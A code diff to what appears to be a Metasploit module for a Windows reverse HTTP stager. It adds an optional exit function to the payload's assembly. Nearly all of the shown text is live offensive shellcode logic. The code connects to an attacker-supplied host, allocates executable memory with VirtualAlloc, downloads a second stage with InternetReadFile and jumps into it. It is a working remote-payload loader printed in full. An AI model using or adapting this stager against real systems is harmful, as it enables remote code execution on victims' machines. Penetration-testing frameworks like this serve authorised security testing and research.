@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/windows/block_api'
+require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
@@ -16,15 +17,17 @@ module Msf
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::Windows::BlockApi
+  include Msf::Payload::Windows::Exitfunk
 
   def asm_reverse_http(opts={})
 
     #
     # options should contain:
-    #    ssl:   (true|false)
-    #    url:   "/url_to_request"
-    #   host:   [hostname]
-    #   port:   [port]
+    #    ssl:     (true|false)
+    #    url:     "/url_to_request"
+    #   host:     [hostname]
+    #   port:     [port]
+    # exitfunk:   [process|thread|seh|sleep]
     #
 
     http_open_flags = 0
@@ -47,7 +50,6 @@ module Payload::Windows::ReverseHttp
       #;0x00000200   ; INTERNET_FLAG_NO_UI
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
     end
-
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
@@ -154,53 +156,68 @@ module Payload::Windows::ReverseHttp
 
       ; if we didn't allocate before running out of retries, fall through to
       ; failure
-
-      failure:
-        push 0x56A2B5F0        ; hardcoded to exitprocess for size
-        call ebp
-
-      allocate_memory:
-        push.i8 0x40              ; PAGE_EXECUTE_READWRITE
-        push 0x1000            ; MEM_COMMIT
-        push 0x00400000        ; Stage allocation (8Mb ought to do us)
-        push ebx               ; NULL as we dont care where the allocation is
-        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
-        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-
-      download_prep:
-        xchg eax, ebx          ; place the allocated base address in ebx
-        push ebx               ; store a copy of the stage base address on the stack
-        push ebx               ; temporary storage for bytes read count
-        mov edi, esp           ; &bytesRead
-
-      download_more:
-        push edi               ; &bytesRead
-        push 8192              ; read length
-        push ebx               ; buffer
-        push esi               ; hRequest
-        push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
-        call ebp
-
-        test eax,eax           ; download failed? (optional?)
-        jz failure
-
-        mov eax, [edi]
-        add ebx, eax           ; buffer += bytes_received
-
-        test eax,eax           ; optional?
-        jnz download_more      ; continue until it returns 0
-        pop eax                ; clear the temporary storage
-
-      execute_stage:
-        ret                    ; dive into the stored stage address
-
-      got_server_uri:
-        pop edi
-        call got_server_host
-
-      server_host:
-        db "#{opts[:host]}", 0x00
       ^
+
+      if opts[:exitfunk]
+        asm << %Q^
+          failure:
+            call exitfunk
+          ^
+      else
+        asm << %Q^
+          failure:
+            push 0x56A2B5F0        ; hardcoded to exitprocess for size
+            call ebp
+          ^
+      end
+
+      asm << %Q^
+        allocate_memory:
+          push.i8 0x40              ; PAGE_EXECUTE_READWRITE
+          push 0x1000            ; MEM_COMMIT
+          push 0x00400000        ; Stage allocation (8Mb ought to do us)
+          push ebx               ; NULL as we dont care where the allocation is
+          push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+          call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+
+        download_prep:
+          xchg eax, ebx          ; place the allocated base address in ebx
+          push ebx               ; store a copy of the stage base address on the stack
+          push ebx               ; temporary storage for bytes read count
+          mov edi, esp           ; &bytesRead
+
+        download_more:
+          push edi               ; &bytesRead
+          push 8192              ; read length
+          push ebx               ; buffer
+          push esi               ; hRequest
+          push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
+          call ebp
+
+          test eax,eax           ; download failed? (optional?)
+          jz failure
+
+          mov eax, [edi]
+          add ebx, eax           ; buffer += bytes_received
+
+          test eax,eax           ; optional?
+          jnz download_more      ; continue until it returns 0
+          pop eax                ; clear the temporary storage
+
+        execute_stage:
+          ret                    ; dive into the stored stage address
+
+        got_server_uri:
+          pop edi
+          call got_server_host
+
+        server_host:
+          db "#{opts[:host]}", 0x00
+        ^
+
+      if opts[:exitfunk]
+        asm << asm_exitfunk(opts)
+      end
     asm
   end
 
